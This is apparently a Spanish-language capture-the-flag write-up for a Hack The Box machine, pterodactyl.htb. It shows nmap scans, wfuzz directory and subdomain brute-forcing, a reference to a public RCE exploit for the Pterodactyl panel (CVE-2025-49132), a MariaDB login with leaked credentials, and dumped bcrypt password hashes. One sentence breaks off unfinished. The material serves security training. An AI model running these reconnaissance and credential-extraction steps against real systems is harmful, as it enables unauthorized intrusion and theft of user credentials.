
`nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.129.3.189 -oG allPorts`

```shell
[*] IP Address: 10.129.3.189
[*] Open ports: 22,80
```

`nmap -p22,80 -sCV 10.129.3.189 -oN targeted`

`wfuzz -c --hc 404 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt http://pterodactyl.htb/FUZZ`

No encontramos nada, pero como vemos que habla de un subdominio `play` haremos una enumeracion de subdominios
`wfuzz -c --hc 404,302 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.pterodactyl.htb" http://pterodactyl.htb`

encontramos el subdominio `panel`
Encontrando un panel de login en la url `http://panel.pterodactyl.htb/auth/login`

En el panel buscamos sobre vulnerabilidades de este panel y en exploit-db encontramos un `CVE-2025-49132` en cual es un RCE que nos permite obtener las credenciales de acceso a una base de datos interna
`https://www.exploit-db.com/exploits/52341`

Encontramos un POC también que nos permite 

mariadb -u pterodactyl -p'PteraPanel' -h 127.0.0.1

select * from users

headmonitor::$2y$10$3WJht3/5GOQmOXdljPbAJet2C6tHP4QoORy1PSj59qJrU0gdX5gD2
phileasfogg3::$2y$10$PwO0TBZA8hLB6nuSsxRqoOuXuGi3I4AVVN2IgE7mZJLzky1vGC9Pi




